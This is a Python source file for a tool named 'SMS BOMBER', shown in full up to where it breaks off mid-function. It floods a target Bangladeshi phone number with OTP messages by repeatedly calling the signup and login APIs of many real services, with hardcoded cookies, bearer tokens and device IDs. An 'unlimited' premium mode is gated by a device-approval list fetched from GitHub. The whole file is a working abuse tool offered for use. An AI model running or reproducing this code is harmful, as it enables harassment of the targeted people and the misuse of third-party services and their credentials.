# Codded By Ariful Islam Arman (ARU)
# writen With python
import os, time, json, sys, random, string, webbrowser, uuid
# color
# Color Value
blueVal = "94m"
redVal = "91m"
greenVal = "32m"
whiteVal = "97m"
yellowVal = "93m"
cyanVal = "96m"
# normal
normal = "\33["
# Bold
bold = "\033[1;"
# italic
italic = "\x1B[3m"
# Color Normal
blue = normal + blueVal  # Blue Color Normal
red = normal + redVal  # Red Color Normal
green = normal + greenVal  # Green Color Normal
white = normal + whiteVal  # white Color Normal
yellow = normal + yellowVal  # yellow Color Normal
cyan = normal + cyanVal  # Cyan Color Normal
# Color Bold
blueBold = bold + blueVal  # Blue Color Bold
redBold = bold + redVal  # Red Color Bold
greenBold = bold + greenVal  # Green Color Bold
whiteBold = bold + whiteVal  # white Color Bold
yellowBold = bold + yellowVal  # yellow Color Bold
cyanBold = bold + cyanVal  # Cyan Color Bold
version = "2.0.4"
# oparetor
robi = "018"
airtel = "016"
grameenohone = "017"
grameenohone_miror = "013"
banglalink = "019"
banglalink_miror = "014"
teletalk = "015"
global oparetor
global number, country_valid, amount,choosed,numbers
# color end
end = '\033[0m'
colorArr = ["\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
# clear
def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def fb():
    if os.name == 'nt':
        webbrowser.open('https://www.facebook.com/Aru.Ofc/')
    else:
        os.system('xdg-open https://www.facebook.com/Aru.Ofc/')

def github():
    if os.name == 'nt':
        webbrowser.open('https://github.com/Aru-Ofc-git/')
    else:
        os.system('xdg-open https://github.com/Aru-Ofc-git/')


def chat():
    if os.name == 'nt':
        webbrowser.open('https://m.me/1R13A14')
    else:
        os.system('xdg-open https://m.me/1R13A14')


def insta():
    if os.name == 'nt':
        webbrowser.open('https://www.instagram.com/aru.ofc.ins/')
    else:
        os.system('xdg-open https://www.instagram.com/aru.ofc.ins/')


def yt():
    if os.name == 'nt':
        webbrowser.open(' https://youtube.com/c/ARULyrics1')
    else:
        os.system('xdg-open  https://youtube.com/c/ARULyrics1')
# Char Print
def printchar(w, t):  # w=word and t =time
    for word in w + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(t)
# Import All Module
try:
    import requests
except:
    printchar(cyanBold + "installing requests.....", 0.05)
    time.sleep(2)
    os.system("pip install requests")
    import requests
    printchar(greenBold + "requests successfully installed.....", 0.05)
    time.sleep(2)
    clr()

try:
    numbers = str.split(requests.get('https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/protract.txt').text)
except:
    printchar(f'{redBold}    NO INTERNET', 0.01)

def banner():
    a = random.choice(colorArr)
    r = random.choice(colorArr)
    u = random.choice(colorArr)
    logo = f'''


{a}	 █████╗   {r}  ██████╗  {u}   ██╗   ██╗
{a}	██╔══██╗  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	███████║  {r}  ██████╔╝ {u}   ██║   ██║
{a}	██╔══██║  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	██║  ██║  {r}  ██║  ██║ {u}   ╚██████╔╝
{a}	╚═╝  ╚═╝  {r}  ╚═╝  ╚═╝ {u}    ╚═════╝ 
	'''
    infoC = random.choice(colorArr)
    toolsInfo = f'''{infoC}
    ╔════════════════════════════════════╗
    ║             {random.choice(colorArr)}SMS BOMBER {infoC}            ║
    ║     {random.choice(colorArr)}AUTHOR: ARIFUL ISLAM ARMAN {infoC}    ║
    ║           {random.choice(colorArr)}VERSION : {version}  {infoC}        ║
    ║           {random.choice(colorArr)} STATUS : FREE    {infoC}       ║
    ╚════════════════════════════════════╝
    '''
    clr()
    print(logo)
    print(toolsInfo)

def banner_premium():
    a = random.choice(colorArr)
    r = random.choice(colorArr)
    u = random.choice(colorArr)
    logo = f'''
{a}	 █████╗   {r}  ██████╗  {u}   ██╗   ██╗
{a}	██╔══██╗  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	███████║  {r}  ██████╔╝ {u}   ██║   ██║
{a}	██╔══██║  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	██║  ██║  {r}  ██║  ██║ {u}   ╚██████╔╝
{a}	╚═╝  ╚═╝  {r}  ╚═╝  ╚═╝ {u}    ╚═════╝ 
	'''
    infoC = random.choice(colorArr)
    toolsInfo = f'''{infoC}
    ╔════════════════════════════════════╗
    ║             {random.choice(colorArr)}SMS BOMBER {infoC}            ║
    ║     {random.choice(colorArr)}AUTHOR: ARIFUL ISLAM ARMAN {infoC}    ║
    ║           {random.choice(colorArr)}VERSION : {version}  {infoC}        ║
    ║         {random.choice(colorArr)} STATUS : PREMIUM  {infoC}        ║
    ╚════════════════════════════════════╝
    '''
    clr()
    print(logo)
    print(toolsInfo)

def option():
    option = f'''{random.choice(colorArr)}
    [1] SMS BOMBING
    [2] SMS BOMBING [premium]
    [3] MORE TOOLS
    [4] CONNECT US
    ''' + end
    print(option)
def option_premium():
    option_premium = f'''{random.choice(colorArr)}
    [1] SMS BOMBING [RANDOM]
    [2] MY ROBI
    [3] MY AIRTEL
    [4] MY GP 
    ''' + end
    print(option_premium)
def premium_bomber():
    try:
        aproved = str.split(requests.get('https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/aprove.txt').text)
    except:
        printchar(f'{redBold}    NO INTERNET',0.01)

    global text
    present_dir = os.getcwd()
    if os.name == 'nt':
        new_path = '.users\.data\.verify\.users\.aprove'
    else:
        new_path = '.users/.data/.verify/.users/.aprove'

    path = os.path.join(present_dir, new_path)
    try:
        os.makedirs(path)
    except:
        pass
    try:
        os.chdir(path)
        cr = open('.verify.txt', 'r')
        text = cr.read()
        cr.close()
        if text == "":
            text = uuid.uuid4()
            os.chdir(path)
            cr = open('.verify.txt', 'w')
            cr.write(str(text))
            cr.close()
        else:
            pass
    except:
        text = uuid.uuid4()
        os.chdir(path)
        cr = open('.verify.txt', 'x')
        cr.write(str(text))
        cr.close()
    if text in aproved:
        clr()
        banner_premium()
        attack_premium()
    else:
        clr()
        banner_premium()
        printchar(f'    {yellowBold}Your Device ID: {cyanBold}{text}{end}', 0.01)
        printchar(f'    {redBold}Your Device not approved. {greenBold}Please connect with {cyanBold}ARU{end}', 0.1)
        fb()
        sys.exit()

def sent_pin(number, amount):
    phone = "+88" + number
    getIPjson = requests.get("http://ip-api.com/json/")
    ip = getIPjson.json()['query']
    infoC = random.choice(colorArr)
    bombInfo = f'''{infoC}
    ══════════════════════════════════════
         {random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{phone}       
      {random.choice(colorArr)}      BOMBING AMOUNT : {random.choice(colorArr)}{amount}        
      {random.choice(colorArr)}     YOUR IP : {random.choice(colorArr)}{ip}
   {infoC} ══════════════════════════════════════
    '''
    clr()
    banner()
    print(bombInfo)
    i = 0
    print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
    while i < amount:
        number_without_zero = number[1:11]
        # REQUESTS
        # NESCO
        try:
            url_nesco = "http://nesco.sslwireless.com/api/v1/login"
            headers_nesco = {"Content-Type": "application/x-www-form-urlencoded"}
            data_nesco = "phone_number=" + number
            requ_nesco_server = requests.post(url_nesco, headers=headers_nesco, data=data_nesco)
            if requ_nesco_server.json()["message"] == "OTP has been Sent.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # MOKAM
        try:
            url_mokam = "https://ucapi.vnksrvc.com/users/send_user_otp.json"
            headers_mokam = {"Content-Type": "application/json"}
            data_mokam = '{"direct_login": true,"user": {"resend": false,"login": "88' + number + '","type": {"register": true}}}'
            requ_mokam_server = requests.post(url_mokam, headers=headers_mokam, data=data_mokam)
            if requ_mokam_server.json()["message"] == f"An OTP has been sent to 88{number}.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # RED X
        try:
            url_redX = "https://api.redx.com.bd/v1/user/signup"
            headers_redX = {
                "Cookie": "_fbp=fb.2.1665770836920.1536218668; _ga=GA1.3.2006512700.1665770837; _gid=GA1.3.1994739738.1665770837; _gat_gtag_UA_159382318_1=1; _hjSessionUser_2064965=eyJpZCI6ImY3ODFmMjQ1LWRmN2MtNWNhNy04NmRlLWYzZWE4MTk5N2NmMCIsImNyZWF0ZWQiOjE2NjU3NzA4MzcyOTYsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMwZDMyNWEzLTJhMGQtNGIyMi1iMmQxLWUzMzU1ODc0YTUzYyIsImNyZWF0ZWQiOjE2NjU3NzA4Mzc0MDEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0",
                "Content-Length": "67",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36",
                "Origin": "https://redx.com.bd",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://redx.com.bd/"}
            data_redX = '{"name":"' + number + '","phoneNumber":"' + number + '","service":"redx"}'
            requ_redX_server = requests.post(url_redX, headers=headers_redX, data=data_redX)
            if requ_redX_server.json()["body"]["message"] == f"A verification code has been sent to {number}":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # Binge
        try:
            url_binge = "https://ss.binge.buzz/api/v3/otp/send/login"
            headers_binge = {"Host": "ss.binge.buzz",
                             "App-Name": "buzz.binge.mobile",
                             "App-Agent": "ANDROID",
                             "App-Version": "65",
                             "Accept": "application/json",
                             "Device-Type": "mob",
                             "Content-Type": "application/x-www-form-urlencoded",
                             "Content-Length": "17",
                             "Accept-Encoding": "gzip, deflate",
                             "User-Agent": "okhttp/4.3.1",
                             "Connection": "close"}
            data_binge = "phone=" + number
            requ_binge_server = requests.post(url_binge, headers=headers_binge, data=data_binge)
            if requ_binge_server.json()["message"] == "OTP sent Successfully":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # Bikroy
        try:
            url_bikroy = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + number
            requ_bikroy_server = requests.get(url_bikroy)
            if requ_bikroy_server.json()["otp_length"] == 6:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # WEB ONE
        try:
            url_web_one = "http://27.131.15.19/lstyle/api/lsotprequest"
            headers_web_one = {"Content-Type": "application/json"}
            data_web_one = '{"shortcode":"2494905","msisdn":"88' + number + '"}'
            requ_web_one_server = requests.post(url_web_one, headers=headers_web_one, data=data_web_one)
            if requ_web_one_server.json()["reponse"] == "SUCCESSFUL":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # Two
        try:
            url_web_two = "http://27.131.15.19:80/lstyle/api/lsotprequest"
            headers_web_two = {"Content-Type": "application/json"}
            data_web_two = '{"shortcode":"2494905","msisdn":"88' + number + '"}'
            requ_web_two_server = requests.post(url_web_two, headers=headers_web_two, data=data_web_two)
            if requ_web_two_server.json()["reponse"] == "SUCCESSFUL":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_arogga = "https://api.arogga.com/v1/auth/sms/send?f=app&v=4.4.3&os=android&osv=25"
            headers_arogga = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "208",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "okhttp/4.9."}
            data_arogga = "mobile=%2B88" + number + "&fcmToken=dfixXPTmTeSRBAFf-utxA-%253AAPA91bG1chvzjost2jd7UNgNeQFJ3s-0ynvXZs4Mat3RuXF0xz4c1yMMn83TL-pwVmAP7NIG45l4M-uJ0JK3n9r5kiDmMI_M6_wkN37O8arFojbXXljcRfj9YgY0jX-SJuumo36V5m8s&referral="
            requ_arogga_server = requests.post(url_arogga, headers=headers_arogga, data=data_arogga)
            if requ_arogga_server.json()["status"] == "success":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_drive = "https://www.mydrivebd.com/sapi/profile?action=signup&notify=true&rid=0.14346360928321888"
            headers_drive = {"Host": "www.mydrivebd.com",
                             "content-length": "126",

                             "x-deviceid": "web-08474b7fff1202e709e8935c10cf5ca3",
                             "content-type": "application/json;charset=UTF-8",

                             "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo Y85) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",

                             "accept": "*/*",
                             "origin": "https://www.mydrivebd.com",
                             "sec-fetch-site": "same-origin",
                             "sec-fetch-mode": "cors",
                             "sec-fetch-dest": "empty",
                             "referer": "https://www.mydrivebd.com/",
                             "accept-encoding": "gzip, deflate, br",
                             "accept-language": "en-US,en;q=0.9",
                             "cookie": "JSESSIONID=0E317BDBE17C4F72F27F47F3047D50FE.1i164",
                             "cookie": "loginRetriesLeft=5",
                             "cookie": "loginRetriesLeft_Date=%3B%20expires%3DTue%2C%2027%20Sep%202022%2021%3A39%3A57%20GMT",
                             "cookie": "cookiesAccepted=true",

                             "cookie": "_ga_G32R4HEST2=GS1.1.1664228417.1.0.1664228417.0.0.0",
                             "cookie": "_ga=GA1.1.1935620814.1664228418"}
            data_drive = '{"data":{"user":{"generic":{"userid":"88' + number + '","password":"' + ''.join(
                random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in
                range(15)) + '","l10n":"en","acceptedtermsandconditions":true}}}}'
            requ_drive_server = requests.post(url_drive, headers=headers_drive, data=data_drive)
            if requ_drive_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_lanka = "https://napi.dmoney.com.bd:6066/DmoneyPlatform/um_public_ekyc_checkMobileEmail"
            headers_anka = {"productCode": "FS",
                            "Authorization": "bearer 9gp0IvDK_5DX1StqaF4__rHnboeHCwayrMsdZ3aNGhoF1jykX7xyoQBASWnSTbnZ5NmMXDinOBhI4rjy-0mXcoPUsFu7Xbdga-sy3TunDsxToMzLqn-zB_3Opi7FbHOLU47kQFLzkPdF8_QADX9eC3Sy-j9IBH5JnoSvL4YADKZic6D_Ok8j7zwfWy3kcXKRgyFje5ft0s-5ztXWGUy-6YOGdbThWoy6LBbK_Yr3Ek8YYGi6",
                            "accept-language": "en", "Content-Type": "application/json",
                            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H)",
                            "Host": "napi.dmoney.com.bd:6066", "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
                            "Content-Length": "493"}
            data_lanka = '{"ekycApplicationData":{"emailId":"mr_kille@yahoo.com","id":0,"mobileNumber":"' + number + '","productCode":"FS"},"channel":"ANDROID_APP","deviceName":"Asus ASUS_Z01QD Android 7.1.2","deviceNumber":"751405a75d71e619","hardwareSignature":"14879d1fcce97c13dd673ee7ce6d7f1c69f56f8880c2d2326f675473472c1dcefb603902376020fc0a75d8a3868a84ebb5c1211abe38c75583d412783bbfcb40","mobileAppVersion":"4.1.1_RELEASE","mobileAppVersionCode":37,"productCode":"FS","requestId":"2015BDC18305FBFB","sessionToken":""}'
            requ_lanka_server = requests.post(url_lanka, headers=headers_anka, data=data_lanka)
            if requ_lanka_server.json()['status'] == 200 and requ_lanka_server.json()['errors'] == None:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
def attack():
    def inValid():
        global number, country_valid, amount
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [MAX 500]: {random.choice(colorArr)}"))
        country_valid = number[:3]
    inValid()
    if number == "":
        printchar(f"{red}    EMPTY INPUT", 0.05)
        time.sleep(2)
        clr()
        banner()
        attack()
    if amount == "":
        printchar(f"{red}    EMPTY INPUT", 0.05)
        time.sleep(2)
        clr()
        banner()
        attack()
    elif len(number) != 11:
        printchar(f"{red}    WRONG NUMBER", 0.05)
        time.sleep(2)
        clr()
        banner()
        attack()
    else:
        if country_valid == robi:
            operator = "Robi"
        elif country_valid == airtel:
            operator = "airtel"
        elif country_valid == teletalk:
            operator = "TaleTalk"
        elif country_valid == grameenohone:
            operator = "GrameenPhone"
        elif country_valid == grameenohone_miror:
            operator = "GrameenPhone"
        elif country_valid == banglalink:
            operator = "Banglalink"
        elif country_valid == banglalink_miror:
            operator = "Banglalink"
        else:
            printchar(f"{red}    INVALID OPERATOR", 0.05)
            time.sleep(2)
            clr()
            banner()
            attack()
        if amount <= 500:
            if number in numbers:
                printchar(f"{red}    PROTECTED NUMBER", 0.05)
                sys.exit()
            else:
                sent_pin(number, amount)
        else:
            printchar(f"{red}    WRONG AMOUNT", 0.05)
            main()

def main():
    ck_act = requests.get('https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/active.txt').text
    clr()
    if 'active' in ck_act:
        pass
    else:
        printchar(f'{redBold}  Tools Deactived', 0.005)
        sys.exit()
    banner()
    option()
    input_options = str(input(f"  {random.choice(colorArr)}  CHOOSE A OPTION: {random.choice(colorArr)}"))

    if input_options == "1":
        clr()
        banner()
        attack()
    elif input_options == "2":
        premium_bomber()
    elif input_options == "3":
        github()
    elif input_options == "4":
        clr()
        banner()
        connectOptions = f'''{random.choice(colorArr)}
    [1] GitHub
    [2] Facebook
    [3] Chat with admin
    [4] Instagram
    [5] YouTube    
            '''
        printchar(connectOptions, 0.005)
        inputConnectOption = str(input(f"  {random.choice(colorArr)}  CHOOSE A OPTION: {random.choice(colorArr)}"))
        if inputConnectOption == "1":
            github()
            time.sleep(5)
            main()
        elif inputConnectOption == "2":
            fb()
            time.sleep(5)
            main()
        elif inputConnectOption == "3":
            chat()
            time.sleep(5)
            main()
        elif inputConnectOption == "4":
            insta()
            time.sleep(5)
            main()
        elif inputConnectOption == "5":
            yt()
            time.sleep(5)
            main()
        else:
            printchar(redBold + "\n    Invalid input", 0.01)
            time.sleep(4)
            main()
    else:
        main()
def attack_premium():
    clr()
    banner_premium()
    option_premium()
    option_choosed = str(input(f"  {random.choice(colorArr)}  CHOOSE A OPTION : {random.choice(colorArr)}"))
    if option_choosed == '1' or option_choosed == '01':
        clr()
        banner_premium()
        global number, country_valid, amount
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [UNLIMITED]: {random.choice(colorArr)}"))
        country_valid = number[:3]
        if number == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        if amount == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        elif len(number) != 11:
            printchar(f"{red}    WRONG NUMBER", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        else:
            if country_valid == robi:
                operator = "Robi"
            elif country_valid == airtel:
                operator = "airtel"
            elif country_valid == teletalk:
                operator = "TaleTalk"
            elif country_valid == grameenohone:
                operator = "GrameenPhone"
            elif country_valid == grameenohone_miror:
                operator = "GrameenPhone"
            elif country_valid == banglalink:
                operator = "Banglalink"
            elif country_valid == banglalink_miror:
                operator = "Banglalink"
            else:
                printchar(f"{red}    INVALID OPERATOR", 0.05)
                time.sleep(2)
                clr()
                banner_premium()
                attack_premium()
            if number in numbers:
                printchar(f"{red}    PROTECTED NUMBER", 0.05)
                sys.exit()
            else:
                sent_pin_pre(number,amount,operator)
    elif option_choosed == '2' or option_choosed == '02':
        clr()
        banner_premium()
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [UNLIMITED]: {random.choice(colorArr)}"))
        country_valid = number[:3]
        if number == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        if amount == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        elif len(number) != 11:
            printchar(f"{red}    WRONG NUMBER", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        else:
            if country_valid == robi:
                operator = "Robi"
            else:
                printchar(f"{red}    INVALID OPERATOR", 0.05)
                time.sleep(2)
                clr()
                banner_premium()
                attack_premium()
            if number in numbers:
                printchar(f"{red}    PROTECTED NUMBER", 0.05)
                sys.exit()
            else:
                my_robi(number,amount,operator)
    elif option_choosed == '3' or option_choosed == '03':
        clr()
        banner_premium()
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [UNLIMITED]: {random.choice(colorArr)}"))
        country_valid = number[:3]
        if number == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        if amount == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        elif len(number) != 11:
            printchar(f"{red}    WRONG NUMBER", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()

        elif option_choosed == '4' or option_choosed == '04':
            my_gp()
        else:
            if country_valid == airtel:
                operator = "Airtel"
            else:
                printchar(f"{red}    INVALID OPERATOR", 0.05)
                time.sleep(2)
                clr()
                banner_premium()
                attack_premium()
            if number in numbers:
                printchar(f"{red}    PROTECTED NUMBER", 0.05)
                sys.exit()
            else:
                my_robi(number,amount,operator)

    elif option_choosed == '4' or option_choosed == '04':
        my_gp()
def my_robi(number,amount,oparetor):
    phone = "+88" + number
    getIPjson = requests.get("http://ip-api.com/json/")
    ip = getIPjson.json()['query']
    infoC = random.choice(colorArr)
    bombInfo = (f'{infoC}\n'
                f'     ══════════════════════════════════════\n'
                f'     {random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{phone}       \n'
                f'     {random.choice(colorArr)}  BOMBING AMOUNT : {random.choice(colorArr)}{amount}        \n'
                f'     {random.choice(colorArr)}  YOUR IP : {random.choice(colorArr)}{ip} \n'
                f'     {random.choice(colorArr)}  OPERATOR : {random.choice(colorArr)}{oparetor}\n'
                f'     {infoC}══════════════════════════════════════\n'
                f'    ')
    clr()
    banner_premium()
    print(bombInfo)
    i = 0
    print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
    while i < amount:
        try:
            url_my_robi = "https://singleapp.robi.com.bd/api/v1/tokens/create_opt"
            headers_my_robi = {
            "Platform" : "android",
            "Appname" : oparetor.lower(),
            "Deviceid" : "1117297acfc89586",
            "Appversion" : "5.4.3",
            "Locale" : "en",
            "Content-Type" : "application/x-www-form-urlencoded",
            "Content-Length" : "20",
            "Accept-Encoding" : "gzip, deflate",
            "User-Agent" : "okhttp/4.2.2",
            "Connection" : "close"}
            data_my_robi = "msisdn=88"+number
            requ_my_robi_server = requests.post(url_my_robi, headers=headers_my_robi, data=data_my_robi)
            if requ_my_robi_server.json()["content"] == "Otp successfully send to user":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass





def sent_pin_pre(number, amount,oparetor):
    phone = "+88" + number
    getIPjson = requests.get("http://ip-api.com/json/")
    ip = getIPjson.json()['query']
    infoC = random.choice(colorArr)
    bombInfo = (f'{infoC}\n'
                f'     ══════════════════════════════════════\n'
                f'     {random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{phone}       \n'
                f'     {random.choice(colorArr)}  BOMBING AMOUNT : {random.choice(colorArr)}{amount}        \n'
                f'     {random.choice(colorArr)}  YOUR IP : {random.choice(colorArr)}{ip} \n'
                f'     {random.choice(colorArr)}  OPERATOR : {random.choice(colorArr)}{oparetor}\n'
                f'     {infoC}══════════════════════════════════════\n'
                f'    ')
    clr()
    banner_premium()
    print(bombInfo)
    i = 0
    print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
    while i < amount:
        number_without_zero = number[1:11]
        # REQUESTS
        # NESCO
        try:
            url_nesco = "http://nesco.sslwireless.com/api/v1/login"
            headers_nesco = {"Content-Type": "application/x-www-form-urlencoded"}
            data_nesco = "phone_number=" + number
            requ_nesco_server = requests.post(url_nesco, headers=headers_nesco, data=data_nesco)
            if requ_nesco_server.json()["message"] == "OTP has been Sent.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # MOKAM
        try:
            url_mokam = "https://ucapi.vnksrvc.com/users/send_user_otp.json"
            headers_mokam = {"Content-Type": "application/json"}
            data_mokam = '{"direct_login": true,"user": {"resend": false,"login": "88' + number + '","type": {"register": true}}}'
            requ_mokam_server = requests.post(url_mokam, headers=headers_mokam, data=data_mokam)
            if requ_mokam_server.json()["message"] == f"An OTP has been sent to 88{number}.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # NBL
        try:
            url_nbl = "https://accountnow.nblbd.com/api/otp-request"
            headers_nbl = {"Content-Type" : "application/json"}
            data_nbl = '{"mobile":"'+number+'"}'
            requ_nbl_server = requests.post(url_nbl, headers=headers_nbl, data=data_nbl)
            if requ_nbl_server.json()["body"]["message"] == "OTP Sended successfully.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # Dmoney

        try:
            url_token = "https://api.dmoney.com.bd:3033/Dmoney/Token"
            headers_token = {"Authorization": "Basic, E8xlkWsSjZKBZ8yQ6VjaQIUM9tUfo/bPdrOy+BATiwc=",
                             "Content-Type": "application/x-www-form-urlencoded",
                             "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; A5010 Build/N2G48H)",
                             "Host": "api.dmoney.com.bd:3033",
                             "Connection": "close",
                             "Accept-Encoding": "gzip, deflate",
                             "Content-Length": "20"}
            data_token = "grant_type=password&="
            resp_token = requests.post(url_token, headers=headers_token, data=data_token)

            url_dmoney = "https://api.dmoney.com.bd:3033/DmoneyPlatform/um_customer_create"
            headers_dmoney = {
            "productCode" : "DM",
            "Authorization" : "bearer " + resp_token.json()["access_token"],
            "accept-language" : "en",
            "Content-Type" : "application/json",
            "User-Agent" : "Dalvik/2.1.0 (Linux; U; Android 7.1.2; A5010 Build/N2G48H)",
            "Host" : "api.dmoney.com.bd:3033",
            "Connection" : "close",
            "Accept-Encoding" : "gzip, deflate",
            "Content-Length" : "638"}
